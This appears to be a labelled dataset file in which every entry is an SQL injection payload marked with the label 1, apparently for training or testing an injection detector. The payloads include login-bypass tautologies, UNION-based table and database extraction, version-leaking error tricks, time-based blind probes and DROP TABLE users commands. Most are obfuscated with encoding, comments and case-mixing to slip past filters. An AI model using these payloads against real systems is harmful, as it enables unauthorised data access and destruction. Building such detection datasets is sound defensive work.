"'%09%09%09%09%09OR%09%09%09%09%09EXISTS(SELECT%09%09%09%09%091%09%09%09%09%09FROM%09%09%09%09%09users)--", 1
"1'        or        If(sUbStrInG(dATABAse(),        1,        1)<%20=%20'A',        slEEP(5),        0)        --", 1
"test'%09OR%09'1'/**/>=%20'1'%09--%09", 1
"%31%29 UnIon seLect 1,dATAB%61se(),3-%2D--0K0Bkl670%627", 1
"'					AND					1/**/ =%09convert(int,@@version) AND 'a'='a'--", 1
"1' || (1=1)IF(sUbStRINg(daTaBase(), 1, 1)IN (1)'A', slEep(5), 0) --#nigy1fwc", 1
"%u00%327%u0020||%u002%30(1=%31)1=%31%u0020--%u0020", 1
"1AND/*%0d%0a*/1=1/*%0d%0a*/", 1
"test'				OR				'1'	=/*!*/ '1'								/*!*/AND				1	=  1--", 1
";SELECT/*%0a*/pg_sleep(5);/*%0a*/--", 1
"", 1
"teST%27%20or%20%271%27%3D%271%27%20/*%20AND%20%27A%27%3D%27A%27", 1
"1%20AND%201%3D1%20OR%20%27b%27%3D%27b%27", 1
";%20%20%20sElECt%20%20%20Pg_sLeeP(5);%20%20%20 -- random_noise--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20----8pcsp20djg77qmp", 1
"1				and				1%20=%201", 1
"%3B%2520sEl%2F%2A%2112345%2A%2FECT%2520Pg_slEEP%285%29%3B%2520--", 1
"' oR eXISTs(sELect 1 fRom usERs)--", 1
"test%27%2F%2A%21%2A%2FOR%20%271%27%3D%271%27%20%2F%2A", 1
"waiTFor%20dElAy%20%270:0:5%27--", 1
"%74es%74'%09%09%09%09OR%09%09%09%09'%31' =  '1'%09%09%09%09--%09%09%09%09", 1
"1'ORIF(substring(database(),1,1)  =	'a',SLEEP(5),0)%0d%0a--", 1
"' || (1=1)EXISTS(SELECT 1 FROM users)--#dhd43yywl4p5a4l", 1
"wAItfoR/*!*/DElAY/**/%u00270:0:5%u0027--", 1
"%27%2F%2A%21%2A%2FOR%20%271%27%3D%271--hexggluo72f5rg", 1
"1%27%2F%2A%2112345%2A%2FOR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"'/**/XOR/**/extractvalue(1,concat(0x5c,version()))--", 1
"%u0%30%327%%750020un%69On%u0020sELECT%u0020nu%4cL,%u0020nuLL,%u0020NULL%%750020%u0%30%32%30Or%u0020(1)--%u0020", 1
"admin'/**/O/*!*/R/**/'1'='1", 1
"%27%20oR%20eXISTS%28SeLECT%201%20from%20USeRS%29--", 1
"'UNIONSELECTnull,null,null--", 1
"", 1
"", 1
"%31)) UN%49%4fN %53ELECT 1,%64atabase(),3----0sarmbht6i", 1
"1%20%20AND%20%201%2509%3D%20%201", 1
"%27%2509%2509%2509%2509AnD%2509%2509%2509%25091%20%3d%20conVErT%28inT%2c%40%40VerSioN%29--", 1
"%u0027					UNION					SELECT					null,					null,					null					--", 1
"%27%20OR%20%271%%327%%33D%271", 1
"1) UNION %53ELECT 1,%64%61tabase(),3%2d-", 1
"1'O/*!12345*/Rascii(substring(database(),1,%0d%0a1))/*%0a*/>100--%0d%0a", 1
"test%u0027%u0020OR%u0020%u00271%u0027>%09= %u00271%u0027%u0020/*", 1
"1%20AND%201%3D1 || (1)", 1
"1 a%4Ed 1=1 Or (1)", 1
"%u0027/*!*/UnIoN%u0020SELeCT%u0020nULl,%u0020null,%u0020nULl%u0020--%u0020", 1
"'%2f**/AND%201=1 --", 1
"'Or/*%0a*/'1'='1%0d%0A", 1
"WAITFOR DELAY '0:0:5'--#dqgwc8", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271#svwdmcht97pudm1", 1
"%27%20U%4eION%20SELECT%2%301%2c2,3--", 1
"'anDEXTracTvAlue(1,conCAt(0X5C,veRSioN()))/*%0a*/or/*%0A*/'B'='b'--%0a#ykjf92rv", 1
"%27And%0D%0aEXTRacTVALuE(1,cONcAT(0X5c,VErsIoN()))--", 1
"tesT' Or '1'='1'  # more_noise--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) XOR 'b'='b'----rm7sff9r20jb", 1
"1)) UNION SELECT 1,database(),3--#kf60voy0u62a8", 1
"WAITfOR	delAy	'0:0:5' /*!*/AND 1=1--", 1
"%3B%2520SELECT%2520pg_sleep%285%29%3B%2520----9558rc36m72girb", 1
"admin'					OR					'1'/*!12345*/ =%09'1", 1
"1))UN/*!12345*/IONSELECT1,database(),3--%0d%0a", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#wa4jwxkgagi", 1
"1%2F%2A%2A%2FA%2F%2A%2112345%2A%2FND%2F%2A%2A%2F1%3D1", 1
"1%27XORascii%28sub%73tring%28databa%73e(),1,1))%0d%0a%3E/%2a%0a*/100%0d%0a-%2d", 1
"'%20%20or%20%20ExIsTs(SElECT%20%201%20%20froM%20%20UsERS) OR 'b'='b'--", 1
"1'%09%09%09%09AND%09%09%09%09substr%69ng(databa%73e(),%201,%09%09%09%09%31)%09%09%09%09%09=  %09%09%09%09's'%09%09%09%09-%2d", 1
"admin%27%20OR%20%271%27%3D%271 OR (1)", 1
"1))%u0020uNioN%u0020sELEcT%u00201,DaTABASE(),3--", 1
"' UNioN seLeCt nuLL, nUll, NuLL  Or (1)--", 1
"%27%20%55nION%20S%45Le%43t%201%2C2%2C3--", 1
";/**/SELECT/**/pg_sleep(5);/**/ # more_noise--#xemra9lgq3", 1
"%u0027/**/&&/**/(1=1)1=1/**/--/**/", 1
"'/**/OR/**/'1'='1#kkhet7yt44pc", 1
"1%27%20%26%26%20%281%3D1%29SuBstRInG%28dATAbasE%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20--", 1
"'/**/AND/**/1LIKE1/**/--/**/", 1
"%27U%4eION/*%0d%0a*/SELECTn%75%6cl,null,null%20--/*%0a*//*%0a*/", 1
"TEsT' or '1'='1' --", 1
"'AND/*%0d%0a*/1=convert(int,@@version)--#0eomxy207zbd4/*%0a*/", 1
"'/*!*/   &&    1 =%20convert(int,@@version) -- random_noise--", 1
"'/*!12345*/ AND  1 LIKE  1  --", 1
"test%u0027			OR			%u00271%u0027%20=	%u00271%u0027			/*", 1
"1%27%20UN/*!*/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--", 1
"'A/*!12345*/ND1IN(1)1/*%0d%0a*/--/*%0a*//*%0a*/--kah1t0o", 1
"1%29%2509%2509UNION%2509%2509SELECT%2509%25091%2Cdatabase%28%29%2C3--", 1
"' unioN Sele%43%54 1%2c2,3--", 1
"'  || (1=1) 1%20=%091  --  --8yruw1k", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#tbcaytycmtjua", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A#a1gvv2", 1
"1'/**/AND substring(database(), 1, 1) = 's' --#y3qlew55mlhx", 1
"test'/**/OR/**/'1'IN (1)'1'/**//*", 1
"'        AnD        EXTRaCtValuE(1,ConCAT(0x5C,VERsiON())) OR 'b'='b'--", 1
"%27%20OR%201%3D1%20%20/*!*/AND%201%3D1--%20", 1
"1'OR%0%61%61scii(substring(%64atabase(),1%2c1%29)%0a>100--", 1
"%u0027%u0020AND%u00201 = 1%u0020--%u0020--6r3befct1r1dvf", 1
"%27AND%250a1%3Dconvert%28int%2C%40%40version%29--%250a", 1
"%3B%20DroP%20TABle%20uSerS%3B%20%20Xor%20%27B%27%3d%27B%27--", 1
"1'%09OR%09IF(substring(database(),%091,%091)%20=/**/ 'a',%09SLEEP(5),%090)%09--", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520----g5p987ajnr", 1
"%27%20%20%20%20AND%20%20%20%201%20%3D%20%201%20%20%20%20 OR 'b'='b'--%20%20%20%20", 1
"1%27%20UNiON%20sEleCt%20tABLe_NAMe%2c%20nUll%2C%20nUll%20FroM%20iNfORMatIOn_schema.TAbLEs%20--", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20/*", 1
";%u0020droP%U0020TaBLe%u0020USerS;%u0020--", 1
"1anD%0a1>=1", 1
"", 1
"test'OR'1'='1'%0d%0a/*/*!*/OR (1)", 1
"%2527%2520UnIon%2520seleCt%2520NuLl%2C%2520NULL%2c%2520nUll%2520--%2520", 1
"admin' O%52 '%31'='1--pohjngr6jo9m1", 1
"'/*!*/OR'1'='1", 1
"", 1
"admin'/**/OR/**/'1'='1#2m8hw7o", 1
"1/**/AND/**/1	IN/**/(1)%201", 1
"%u0027%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,2,3--#fqrlrjj", 1
"'/*!*/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"%27UNIONSELECTnull%2C%250anull%2Cnull%2F%2A%250a%2A%2F--", 1
"' UNI%4fN S%45LECT 1,%32,3--", 1
"test'/*!*/OR/**/'1'='1'/**//*/**/OR/**/(1)--yxncg", 1
"%u00%327%u0020%4fR%u0020EXISTS%28SELECT%u00201%%75%30020F%52OM%u0020users)--", 1
"1%27%20O/*!*/R%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 /*!*/AND 1=1--", 1
"'/**/UNION/**/SELECT/**/1,2,3--#qrywucaa7uq7bhn", 1
"admin'					OR					'1'/*!*/=  '1", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520----719xl7dc311", 1
"admin'OR%0a'1'='1", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A%20OR%20%27b%27%3D%27b%27", 1
"%27%2F%2A%2A%2FA%254eD%2F%2A%2A%2F1%3Dcon%2576ert%28in%2574%2C%40%40versio%256e%29----1f7pr", 1
"%27%20unIon%20SelecT%201,2,3--", 1
";drOpTABleUSerS;/*%0d%0a*/--", 1
"admin' || (1=1)'1'='1 # more_noise", 1
"%27%2%30AND%201%3D1%%320--%20", 1
"admin'OR'1'='1%0a", 1
"test'  OR  '%31'<  =	'1%27 %20/*", 1
"1%27%20Or%20aSCiI(SUbsTriNG(DAtabaSE(),%201,%201))%20%3e%20100%20 Or 'b'='B'--#I177sfE563fA", 1
"1'OR/*%0a*/ascii(substring(database(),/*%0d%0a*/1,1))>100", 1
"--", 1
"1'UNIONSELEC%54%2f%2a%0a*/table_name%2cnull,nullFROMinformati%6fn%5fsc%68e%6da.tables--", 1
"1))/**/unION/**/selEct/**/1,DataBase(),3--", 1
";/*!*/SELECT pg_sleep(5); ----43fi6vm1zv0", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20%20OR%20(1)--", 1
"'/**/||/**/(1<=1)1=1/**/--/**/#j2lgnojp77o1fmc", 1
"' unioN sElEcT 1,2,3--", 1
"test%27/**/OR/**/%271%27%3D%271%27/**/--/**/", 1
"%3B%2F%2A%21%2A%2FDROP%20TABLE%20users%3B%20--", 1
"1))    UNION    SELECT    1,database(),3--", 1
"1'ORascii(substring(database(),1,1))>", 1
"100", 1
"--%0a", 1
"%u0027%09%09%09%09AN%44%20ext%72ac%74%76alue(1,concat(0x5c,version()))--", 1
"test%25u0027%2520OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%252f%2A", 1
"TeSt'/*!*/     or      '1'	=	'1'      --      --0flr3z5zmy", 1
"1)UNION", 1
"SELECT1,database(),3--", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**//**/AND/**/%u0027a%u0027=%u0027a%u0027--", 1
"1%27AND%250d%250asubstring%28database%28%29%2C%2F%2A%250d%250a%2A%2F1%2C1%29%250a%2509%3D%2520%27s%27--", 1
"adm%69n%u0027/**/OR/**/%u0027%31%u0027=%u00271", 1
"' OR 1=1 -- --yuqdzx1dflcrm", 1
"test%27%20XOR%20%271%27%3D%271%27%20%2F%2A--7mocjiz7hvu37", 1
"' %41nD 1=CoNveRT%28iNT,@@vERSI%6f%6E) # more_nOIsE--", 1
"'AND/*%0d%0a*/1=convert(int,@@version)--#ne0c2meiodjqtt%0d%0a", 1
"%27%20OR%20%271%27%3D%271OR'b'='b'", 1
"", 1
"%27%20A/*!12345*/ND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#emkyollb", 1
"test'OR'1'='1'--/*%0a*/", 1
"1%29%2520UNION%2520SELECT%25201%2Cdatabase%28%29%2C3--%23lwn5x6l7hy", 1
"1'UNION/*%0a*/SELECTtable_name,null,null%0d%0aFROMinformation_schema.tables--%0d%0a", 1
"1%u0027%20ORIF(substri%6e%67(database(),1,1)=%u0027%61%27%2c/*%0a*/SLEEP(5),0)--/*%0a*/", 1
"' ANd ExtraCtvALue(1,concat(0x5C,vERsIOn()))--", 1
"1)		UN/**/ION		SELECT		1,database(),3--", 1
"'/*!*/OR/**/exiSTS(sELecT/**/1/**/FROm/**/userS)--", 1
"waItfoR/**/DeLay'0:0:5'--/*%0a*/", 1
";%20SELECT%20pg_sleep(5);%20 OR (1)--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%271%27%u0020%2d-%u0020--re4a%737vdon9uu", 1
"1) UNION SELECT 1,database(),3 XOR 'b'='b'--", 1
"' XOR '1'<='1 /*!*/AND 1=1", 1
"1'          OR          ascii(substring(database(),          1,          1))          >          100          --", 1
"'/*!12345*/OR 1=1  /*!*/AND 1=1--", 1
"WAITFOR/*!12345*/DELAY/**/'0:0:5'--", 1
"admin'/**/OR%20%20'1'%09=/**//**/'1", 1
"1'ORascii(substring(database(),1,/*%0d%0a*/1))>%0d%0a100AND'a'='a'--", 1
"", 1
"' OR EXISTS(SELECT 1 FROM users)----5l7vuqyql", 1
"1%27%20or%20AScII%28sUBstriNG%28dAtAbasE%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20anD%20%27A%27%3D%27a%27--", 1
";%20DROP%20TABLE%20users;%20----g602yrcte9y", 1
"'/**/AnD/**/ExtrACtvALue(1,CoNCat(0x5c,VeRSioN()))--", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----qodmrh", 1
"1'          UNION          SELECT          table_name,          null,          null          FROM          information_schema.tables          --", 1
"1/**/AND/**/1=1 -- random_noise", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----sbz4ycmfulg6jk", 1
"; %53EL%45CT pg_sl%65ep(5); --", 1
"test'   OR   '1%27IN   (1)%271'   /*%20AND   'a'%3d'a'", 1
"1'        AND        substring(database(),        1,        1)        %09=%09        's'        --", 1
"TEst%U0027%u0020%u0020%U0020%u0020%U0020%u0020Or%U0020%u0020%u0020%U0020%u0020%U0020%U00271%U0027%U0020=%20%U00271%u0027%U0020%u0020%U0020%u0020%u0020%U0020/* oR (1)", 1
"1'oR", 1
"ASCiI(SuBSTriNG(dAtaBAsE(),1,1))>%0a100 OR (1)--", 1
"1'	OR	ascii(substring(database(),	1,	1))	>	100	--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--#u2rcr6nyi", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3 -- random_noise----doeg9fon2zssjy", 1
"1)/*!12345*/UNION %53E%4cECT 1%2cdataba%73e(),3--", 1
";%20DROP%20TA%42LE%%320users;%20%2d-", 1
";DROP/*%0a*/TABLEusers;--", 1
"1))%20UNION%20SELECT%201,database(),3 AND 'a'='a'--", 1
"'/**/AND 1=coNVeRt(iNT,@@veRSiON)--#85eWKc3YxmbIk", 1
"%u%3002%37%u00%320anD%u00201=1%%750020--%u0020", 1
"'				&&				(1%20=/*%0d%0a*/1)extractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"1%29%29%2F%2A%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1'        uNiON        SeLEct        TABLE_Name,        nulL,        NuLl        FrOM        InFORMaTiON_sChEma.tABles        ----Th0GjfPaKD7n", 1
"%2527%2520OR%25201%253D1%2520--%2520#5bpcma8a", 1
"%u0027/**/AND%u00201%3Dconvert(int,@@version)--", 1
"1%2%30A%4eD%201%3D%31--rx08x0px0jgdn", 1
"' UNION SELECT 1,2,3--#s25co2fh6pmccu", 1
"1' OR a%73cii(substr%69ng(dat%61bas%65(), 1, 1)) %3e 100 --", 1
"%27%20&&%20extractvalue(1,concat(0x5c,version()))--", 1
"1)/*!*/UNION SELECT 1,database(),3 OR (1)--", 1
"WAITFOR    DELAY    '0:0:5'--#8oy344s", 1
"1	AND	1	=%201", 1
"1'					unIon					select					taBle_N%61mE,					Null,					nu%6c%6c					f%52OM					%69nForMation_SC%68emA.%74ABl%65s					----zwq6395D", 1
"' UN%49O%4e SELEC%54 nul%6c, null, null --", 1
"' OR 1%3d1 --%20#0f05anl", 1
"admin%%32%37%20OR%20%271%27L%49KE%271", 1
"admin'/**/OR/**/'1'%20= '1", 1
"' Or 1=1  /*!*/and 1=1--", 1
"1%20%20anD%20%201%20=	1 oR 'b'='b'", 1
"admin%27%%320OR%20%2%371%2%37%3C%3D%271", 1
"%27%20OR%201%3D1%20--%20#e8u1t48dbfy2k", 1
"%27%20ANd%20EXTracTvaLuE(1,CONCat(0x5c,VerSIon()))--", 1
";		SelEct		PG_slEeP(5);		----v9c9d", 1
"1))%20unIoN%20seleCt%201,DaTAbasE(),3----6IwlLa118EC6E", 1
"%27/**/aND/**/1=cOnveRt(InT%2c@@V%65%72SION)--", 1
"%3B%20DR%4f%50%20TAB%4cE%20u%73ers%3B%20%20/*!*/AND 1=1--", 1
"'%09%09%09%09%09AND%09%09%09%09%091%20=convert(int,@@version)%09%09%09%09%09AND%09%09%09%09%09'a'%20=%0a'a'--%0a", 1
"' O%52 EXISTS(SELECT 1 FROM%20%75sers)-%2d--sf4mm8", 1
"%u0027%u0020||%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--", 1
"' XOR EXISTS(SELECT 1 FROM users)--", 1
"'/**/uNion     seLeCT     1,2,3     /*!*/AND     1%09= 1--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020#%u0020more_noise--", 1
"1'%20%20%20%20ANd%20%20%20%20SuBStRIng(DatAbAsE(),%20%20%20%201,%20%20%20%201)%20%20%20%20%09=  %20%20%20%20'S'%20%20%20%20--#w4ngiwbx06otqb", 1
"%u0%302%37%u0020AND%%7500201=convert(%69nt,@@versi%6fn)--", 1
"1 And 1>=1 OR (1)", 1
"%3B%20dRoP%20TablE%20usERS%3b%20 -- random_noise--", 1
"%u0027OR1=1/*%0d%0a*/--", 1
"' AND extractvalue(1,concat(0x5c,version()))----keeq3zak92b91", 1
"' unioN selECt 1,2,3--", 1
"%27%20UNION%20%2553%2545%254cECT%201%2C2%2C3--", 1
"%31%27 XOR substring(da%74abase(), 1, %31) = 's%27 --", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----7d61jv0", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%2F%2A%20%2F%2A%21%2A%2FAND%201%3D1", 1
"1)%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%201,database(),3--", 1
"1) UNI%4fN SELECT 1,databas%65()%2c%33--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)%20OR%20(1)--", 1
"1 ANd 1=1", 1
"1'%41NDsubstring(database()%2c%31,1)%3d's'%2f*%0a*/%2d-random_noise--", 1
"'UNION%0d%0aSELECT1,2,3 /*!*/AND 1=1--/*%0d%0a*/", 1
"1/**/AND/**/1=1#2r2eclv", 1
"test' OR '1'='1' -- --kwxfwmtr06x92r", 1
"1'/*!12345*/or if(SubSTRING(dATabaSE(), 1, 1)='a', slEEP(5), 0)  -- RAnDOM_NoIse--", 1
"TeST'oR'1'='1'/*%0d%0a*//*--6zcxia5/*%0a*/", 1
"1%27%20%20UNION%20%20SEL%2545%2543T%20%20tab%256ce_name%2C%2520%20null%252c%2520%20null%20%20FROM%20%20information_schema.table%2573%20%2520-%252d", 1
"'/**/OR '1'='1--gzoqrxf", 1
"1'    AND    substring(database(),    1,    1)    %09=%09    's'    --", 1
"'UNION/*%0d%0a*/SELECT%0d%0a1,2,3 /*!*/AND 1=1--/*%0a*/", 1
"ADmin%25u0027%25u0020or%25U0020%25U00271%25U0027%3D%25u00271", 1
"%31'/*!12345*/A%4eD substring(database(), 1, 1) = 's%27 %2d%2d -- random_noise", 1
"%25u0027%25%2575%25300%25320AND%25u0020extractvalue%28%2531%252cconcat%280x5c%2Cversion%28%29%29%29%252d-", 1
"1%2F%2A%2A%2FXOR%2F%2A%2A%2F1%3D1", 1
"1/**/&&/**/1=1", 1
"1)) UNioN SElecT 1,Database(),3--", 1
"1%2527%2520UNION%2520SELECT%2520table_name%2C%2520null%2C%2520null%2520FROM%2520information_schema.tables%2520%20OR%20%27b%27%3D%27b%27--", 1
"'/**/aND/**/1=cOnvERt(inT,@@vErsIoN)--", 1
"'/**/AND1=1/*%0a*/--", 1
"/*%0a*/", 1
"1'ANDsubstring(database(),1,1)=%0a's'/*%0a*/--%0a", 1
"%27/*!12345*/a%4Ed 1=1  # more_noise--", 1
"1%20AND%20%2531%3D1", 1
"%u0027%u0020UN/**/ION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"1%29%25u0020UNION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3%25u0020%2F%2A%21%2A%2FAND%25u00201%3D1--", 1
"'/**/AND/**/1=convert(int,@@version)/*!*/AND%0a1=1--/*%0d%0a*/", 1
"' aND 1=CoNVeRT(InT,@@VERsion)--", 1
"; SEL%45CT pg_sleep%285);%20--", 1
"test%u0027%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020%u0020%u00271%u0027	=	%u00271%u0027%u0020%u0020%u0020%u0020%u0020%u0020/*%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020%u0020%u0027b%u0027	=	%u0027b%u0027", 1
"%25U0027%25U0020AnD%25u0020EXtRAcTVAlue%281%2CCOnCaT%280x5C%2CvErsiOn%28%29%29%29--", 1
"; select Pg_slEEp(5);  or 'B'='B'----0vMCO43", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"'/**/AND/**/ex%74ractvalue(%31,conca%74(0%785c,v%65rsion()))-%2d--tt0tv", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20 AND 'a'='a'----vdzo78yb4rfg", 1
"1/*!12345*/anD 1=1--J8o6q1qI8", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----au2ad", 1
"1)UNION", 1
"SELECT/*%0a*/1,database(),3--/*%0a*/", 1
"test%27%2F%2A%2A%2For%20%271%27%3D%271%27%20--%20", 1
"test' OR '1'='1'%20/%2a", 1
"1)		UN/**/ION		SELECT		1,database(),3--#5ab8dvj", 1
"'AND%0a1>=convert(int,@@version)--/*%0d%0a*/--11x1e7o", 1
"test%u0027/**/OR/**/%u00271%u0027%20=%20%u00271%u0027/**//*", 1
"%74est'				OR				'1'%%320=	%271'				%2d-", 1
"1AND%0d%0a1=1", 1
"-- random_noise", 1
"1%u0027UNION%0d%0aSELECTtable_name,null,nullFROM%0ainformation_schema.tables/*%0a*/--", 1
"'%20%20%20%20AND%20%20%20%20extractvalue(1,concat(0x5c,version()))--#ev3tm3i1ugbrs5e", 1
"' And 1<=COnvERT(INt,@@VErsION)--", 1
";%20SELECT%20pg_sleep(5);%20%20/*!*/AND%201%3D1----iwglsm100wnrpm", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020----qg8o33h9z36b7", 1
"admin'/**/OR/**/'1'='1#6v7sci6yq", 1
"%57AITF%4f%52%20DELAY%20%270:0:5%27--", 1
"'    &&    1>  =%09conve%72t(i%6et,@@versio%6e)-%2d", 1
"%27/**/UNION/**/SELECT/**/1,2,3----3xraw", 1
"ADMIn%27%20O/**/R%20%271%27%3d%271--OKiKo1ic1Lola0C", 1
"1%u0027ORIF(substring(database(),/*%0a*/1,1)%3D%u0027a%u0027,SLEEP(5),0)", 1
"--/*%0a*/", 1
"1)) UNION SELECT 1,database(),3 OR 'b'='b'--#ghnxr", 1
"WAITFOR/**/DELAY/**/%270:0:5%27--", 1
"1 AND 1=1#2ldy9i8e7op86i", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%u0020#%u0020more_noise--%u0020", 1
";SELECT%0apg_sleep(5);/*%0a*/--%0d%0a", 1
"1'/**/OR/**/iF(SubsTRINg(DATAbaSE(),/**/1,/**/1)='A',/**/SleEp(5),/**/0)/**/--", 1
"1/**/A/*%2112345*/ND/*%2a/1%3d1", 1
"'/**/AND/**/1=convert(int,@@version)--#eag4pwt1az41z", 1
"' or '1'='1#7eyrjqlfgp6u", 1
"'/*!12345*/OR '1'<%09= '1 OR (1)", 1
"1))UNIONSELECT/*%0a*/1,database(),3--%0a", 1
"'UNION%0d%0aSELECT%0d%0a1,2,3--", 1
"", 1
"1%20and 1lIkE1#e0rigjmu17xe", 1
"'/*!12345*/aNd%09%091	=%091%09%09--%09%09", 1
"WAITFOR DELAY '0:0:5'--#rd2v4rqktw", 1
"' || (1=1)EXISTS(SELECT 1 FROM users) OR 'b'='b'--", 1
"1' UNioN SeleCt tABLe_NAme, nULl, NULL fRoM InformaTIon_SChEmA.tAbLes --", 1
"test'%09%09%09%09OR%09%09%09%09'1'  =%20'1'%09%09%09%09--%09%09%09%09", 1
"%27%20anD%201%3D1%20%20#%20more_noise--%20", 1
"%27%%32%30AND%20%31%3Dcon%76ert%28int%%32C%40%40version%29--", 1
"' OR EXISTS(SELEC%54 1%20FROM u%73er%73)--", 1
"1%27%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2For%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2FaScii%28SubStrINg%28DATAbASe%28%29%2C%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F1%2C%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%3E%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F100%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F--", 1
"'/*!*/&& 1=1 --", 1
"1%20A%254eD%201%3D1--dmje%2537h", 1
"1AND/*%0a*/1/*!12345*/=  1", 1
"", 1
"%27%20%4fR%20%271%2%37%3D%271%23rg80whxa%7893%6bex", 1
"'/**//**//**//**//**//**/Or/**//**//**//**//**//**/EXISts(SELeCt/**//**//**//**//**//**/1/**//**//**//**//**//**/FROM/**//**//**//**//**//**/USErs)----mLhTvGHvx3gI", 1
"%27%20AND%201%3C%3D1%20--%20--72buyezbtb0cw", 1
"%3B%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2FOR%2F%2A%250d%250a%2A%2F%27b%27%3D%27b%27--%0A", 1
"1)%20%55NION%20SEL%45CT%201,dat%61base(),3%20--%20ra%6edo%6d_noise--", 1
"%27%20OR%2520%271%27%253d%271", 1
"%U0027%U0020And%U00201%09=%09CoNVERT(INt,@@VErsiON) AND 'a'='a'--", 1
"test'/*!12345*/OR%20%20%20%20'1'%20LIKE	'1'%20%20%20%20--%20%20%20%20", 1
"admin%27%20||%20%271%27%3D%271%u0020--%u0020random_noise", 1
"TesT'/*!*/or'1'='1'", 1
"--%0d%0A%0A", 1
"'   AND   extractvalue(1,concat(0x5c,version()))--", 1
"%27%2%30UNION%%320SELECT%201%2C2%2%433--#xnlbset7zn", 1
"1%25u0020A/*!*/ND%25u00201%3D1", 1
"waiTfor%u0020dELaY%u0020%u00270:0:5%u0027--", 1
"1)/**/union/**/sElecT/**/1,dATaBAsE(),3--", 1
";DROP%0d%0aTABLEusers;--", 1
"1%27%20aNd%20SuBSTRIng(databASe(),%201,%201)%20lIke%20%27S%27%20--", 1
"1))UNIONSELECT%0a1,database(),3/*%0d%0a*//*!*/AND/*%0a*/1=1----1h8teplft2664fz", 1
"1%u0027%u0020O/*!12345*/R%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1%27/**/UN%49ON%20SEL%45CT%%320table_name,%20nu%6cl,%20null%2%30FROM%20i%6eformation_s%63hema.t%61bles%20%2d-", 1
"%27%2F%2A%2A%2FoR%20eXIStS%28SeLecT%201%20FrOM%20USeRs%29--#bn4mkip48tm4a", 1
"%27/*!12345*/AND%201%3dCONvERT(int,@@VerSiON)--", 1
"test%27%20OR%20%271%27%3E%3D%271%27%20/*", 1
"'UNIOnsELECTNull,/*%0A*/nULl,NulL--/*%0a*/", 1
"1))UNION/*%0a*/SELECT1,database(),3--", 1
"1))/**/UN/*!12345*/ION/**/SELECT/**/1,database(),3--", 1
"test'O/*!*/R/*%0d%0a*/'1'='1'/*%0d%0a*/--%0d%0a", 1
";%09SELECT%09pg_sleep(5);%09 -- random_noise--", 1
"'/*!12345*/OR '1'='1 AND 'a'='a'", 1
"1)/**/UN%49ON SEL%45CT 1,%64ataba%73e(),3 && (1=1)'a'='a'--", 1
"admin%27%20OR%20%271%27%3D%271#9kp32r5sbfwwoa", 1
"'UNION/*%0d%0a*/SELECT%0a1,2,3--/*%0a*/", 1
"1'/**/UNiO%4e SElECT tabLE_nAmE, NUl%6C,%20nuLL FRO%4D INfO%72matiOn_S%63hem%61.tAb%6CeS ----z54Q87N7ZA4XCL", 1
